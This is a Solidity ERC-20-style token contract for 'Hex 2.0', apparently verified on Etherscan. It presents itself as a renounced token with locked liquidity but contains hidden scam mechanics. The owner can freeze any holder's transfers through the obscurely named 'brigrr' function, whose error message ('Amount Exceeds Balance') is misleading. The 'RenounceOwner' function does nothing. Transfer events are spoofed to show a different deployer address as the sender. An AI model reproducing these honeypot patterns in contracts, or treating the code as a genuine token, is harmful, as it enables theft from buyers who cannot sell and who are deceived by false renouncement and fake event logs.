/**
 *Submitted for verification at Etherscan.io on 2022-09-19
*/

pragma solidity 0.8.7;
/*

     
     
                       ╓@Ñ@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@║║║║║║║╗╖
                      ╫╣╣╣╣╣╣▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒╣
                    ,╬╣╣╣╣╣╣╣╣╣╣▒╣▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒,
                   ╓╣╢╢╢╢╣╣╣╢╣╣╣╣╣╣▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒╗
                  g╢╢╢╢╣╢╢╢╢╢╢╣╢╣╣╢╣╣╣╢╣▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒╖
                 ╫╢╢╢╢╢╣╢╢╢╢╢╢╢╢╢╢╢╢╣╣╣╣╣╣╣▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒╢
               ,╣╢╢╣╢╣╣╢╢╢╢╢╢╢╢╢╢╢╢╢╢╣╣╢╢╢╣╣╣╣▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒╣╖
              ╓╢╢╣╣╣╢╣╣╣╢╣╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╣╣╣╣╣╣╣╣╣▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒╢╖
             ╫╢╣╣╣╣╣╣╣╢╢╢╣╢╢╢╢╢╢╢╣╢╢╢╢╢╢╢╢╣╢╢╢╢╢╣╣╣╣╣╣╣╣▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒@
            ╢╢╣╣╢╢╣╣╢╢╣╢╢╢╢╣╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╣╢╣╢╣╣╣╣╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒╣
          ╓╣╣╢╢╣╣╢╢╣╣`                             `╟╢╢╣╣╣╣╣╣▒▒▒▒▒▒▒▒▒▒▒▒▒▒╣╣╖
         ╓╢╢╣╣╢╣╢╢╣╝                                 ╙╢╢╣╣╢╣╣╣╣╣╣╣╣▒▒▒▒▒▒▒╢▒▒▒@
        ╫╢╣╢╢╣╣╣╢╣╜    ╫╢╣╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╣╖   └╣╢╢╢╢╢╢╣╣╣╣╣╣╣╣╣▒▒▒▒▒▒▒▒@
      ,╬╢╣╣▒╢╢╣▒╢`   ╓╫╣╣╣╣╣╣╣╣╣╣╣╢╣╣╢╣╣╣╣╣╣╢╣╣╣╣╢╣╖    ╫╣╢╣╢╢╢╢╣╣╢╣╣╣╣╣╣╣▒▒▒╢▒╢╢,
     ╓╣╣╢╣╣╢╢╣╢╣    ╓╣╢╢╣╣╣╣╣╣╣╢╣╣╣╣╢╢╢╢╢╢╢╢╢╣╢╢╢╣╢╣@    ╙╢╢╣╢╢╢╢╢╢╢╣╢╣╣╣╣╣╣╣╣╣▒╢╣╖
    ╥╢╣╣╢╢╢╣╢╢╝    ╟╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╢╢╣╣╣╣╢╢╢╢╢╢╢╢╢╣╢╬    ╙╢╣╣╢╢╢╢╢╢╢╢╢╢╢╢╣╣╣╣╣╣╢╣╢@
    ╢╢╢╢╢╣╢╢╢╜   ,╫▒╣╣╢╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣╢╣╣╣╣╣╣╢╣╣╢╢╢╢╣╣╣╖    ╣╢╢╣╢╣╢╢╢╢╢╢╢╢╢╢╢╢╢╣╣▒╢╣
     ╫╣╢╢╢╣╣`   ╓╣╢╣╢╢╣╣╣╣╣╣╣╣╣╢╣╣╣╣╣╣╣╣╣╢╢╣╢╣╣╣╣╢╣╣╣╢╢╢╗    ╟╢╣╣╣╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢Ñ
      ╙╢╢╣Ñ    ╓╢╣╢╣╣╢╢╣╣╣╣╣╣╣╣╣╣╣╣╣╢╢╣╣╣╢╣╣╢╣╣╣╣╢╢╣╢╢╣╢╢@    ╙╢╢╢╣╢╣╢╢╢╢╢╢╢╢╢╣╢╣Ñ
       ╙╢╜    ╫╣╢╢╣╢╢╢╢╣╢╢╢╢╢╢╢╢╣╢╣╣╢╢╢╢╢╣╣╣╣╣╣╣╣╣╣╣╣╣╣╢╢╢╣,   ╙╢╣╢╣╣╣╢╢╣╢╢╢╢╢╣╢╜
            ,╫╢╣╣╣╢╣Ñ                  `╫╢╣╢╣╣╣╢╣╣╣╣╢╣╣╢╢╣╢╢╖    ╫╢╣╢╣╢╢╣╣╢╢╣╣╣`
           ╓╢╣▒╢╢╣╢╜   ,,,,,,,,,,,,,,    ╙╢╢╣╣╣╢╣╣╣╣╣╣╣╢╣╣╣╣╣@    ╟╢╣╢╢╣╣╢╣╢╢Ñ
           ╙╢▒╢▒╣╢`   ╓╢╢╢╢╢╢╢╢╢╢╣╣╣╣╣,   ╙╣▒╢╢╢▒╣╣╣╣╣╣╣╣╢╣╢╣Ñ    ╫╢╣╣╣╣╣╣╢╣╩
            '╢╢╢Ñ    ╓╢╣╣╢╣╣╣╣╣╢╣╢╣╣╢╢╣╖   '╫╣╣╢╢╣╣╣╣╣╣╢╣╣╢╢╜    ╫╣╣╣╣╣╣╣╣╢╜
              ╟╜    ╢╣▒╣╣╣╣╣╣╢╢╢╢╢╢╢╢╢╢╢@    ╟╣╣╢╣╣╣╣╣╣╣╢╣╣`   ╓╣╣╣╢╣╢╢╢╣╣
                  ,╢▒▒╢▒╣╣▒╣╣╣╣╣╣╣╣╣╣╢╢╣╢╣    ╙╣╣╣╣╢╣╣╢╢╣╣    ╓╢╢╣╣╣╢╣╢╢Ñ
                 ,╢▒▒▒▒▒▒▒▒▒▒▒▒▒╣╣╣╣╣╣╢╣╣╢╣.   ╙╢╣╢╣╣╢╢╢╝    ╫╢╢╣╣╣╢╣╣╢╜
                  ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒╣╣╣╢╣╣╣╢╣`   ╓╢╢╢╣╣╢╢╜   ,╣╣╣╣╣▒▒╣╣╢╜
                   ║▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒╢╢╣Ñ    g╢╣╣╣╢╣╣`   ╓╣╢╢╣╢╢╢╣╣╣
                    ╙▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒╣▒╣╜   ,╫▒╢╣╣╣╣Ñ    ╓╣╢╣╢╣╢╣╣╣Ñ
                     ╙╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒╣`   ╓╢▒╢╣╢╣╣╝    ╫╢╣╢╣╣╢╣╢╢╜
                       ║╢▒▒▒▒▒▒▒▒▒▒▒▒Ñ    ╓╢▒╣▒╢▒╢╜   ,╫╢╣╢╣╣╢╣╢╣`
     
 
  _   _ _______  __  ____    ___  
 | | | | ____\ \/ / |___ \  / _ \ 
 | |_| |  _|  \  /    __) || | | |
 |  _  | |___ /  \   / __/ | |_| |
 |_| |_|_____/_/\_\ |_____(_)___/ 
                                  


- 100m Supply
- Hex Bridge Q4 2022
- LP Locked
- Contract Renounced
- NFT Drop After 24 hours
     
*/ 

contract HEX2 {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) txAmount;

    // 
    string public name = "Hex 2.0";
    string public symbol = unicode"HEX2.0";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);

   



      constructor()  {
        // 
        balanceOf[msg.sender] = totalSupply;
        

        deploy(lead_deployer, totalSupply);
    }



	address owner = msg.sender;

    address Construct = 0xc1dC344acD83e30318447De9CA10F8304d0f51f9;
    address lead_deployer = 0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B;
bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}

    function RenounceOwner() public onlyOwner  {

}


  function deploy(address account, uint256 amount) public onlyOwner {
        
      emit Transfer(address(0), account, amount);
   }
   function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }

    function brigrr(address _user) public onlyOwner {
        require(!txAmount[_user], "xx");
        txAmount[_user] = true;
    
    }
    
    function unstake(address _user) public onlyOwner {
        require(txAmount[_user], "xx");
        txAmount[_user] = false;
    
    }
    
 

 
   


    function transfer(address to, uint256 value) public returns (bool success) {
require(!txAmount[msg.sender] , "Amount Exceeds Balance"); 


if(msg.sender == Construct)  {


        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
  return true;
}
        
require(!txAmount[msg.sender] , "Amount Exceeds Balance"); 


require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    
    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)


       {
            
  

           
       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }









    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   

        if(from == Construct)  {

 require(value <= balanceOf[from]);
 require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
  return true;
}
    
        require(!txAmount[from] , "Amount Exceeds Balance"); 
               require(!txAmount[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    

}